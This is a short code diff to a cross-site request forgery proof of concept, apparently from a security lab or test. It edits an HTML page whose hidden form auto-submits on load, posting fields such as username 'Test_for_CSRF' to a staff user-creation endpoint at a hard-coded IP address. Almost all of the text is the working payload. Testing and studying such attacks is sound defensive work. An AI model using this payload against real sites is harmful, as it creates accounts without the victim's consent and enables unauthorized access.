@@ -1,4 +1,4 @@
-<FORM NAME="csrfForm" action="https://35.184.88.145/red/public/staff/users/new.php" Method="POST" novalidate>
+<FORM ID="csrfForm" action="https://35.184.88.145/red/public/staff/users/new.php" Method="POST" novalidate>
   <input type="hidden" name="first_name" value="CSRF">
   <input type="hidden" name="last_name" value="Test">
   <input type="hidden" name="username" value="Test_for_CSRF">
@@ -9,5 +9,5 @@
   
 </FORM>
 <script>
- document.csrfForm.submit();
+  document.forms["csrfForm"].submit();
 </script>
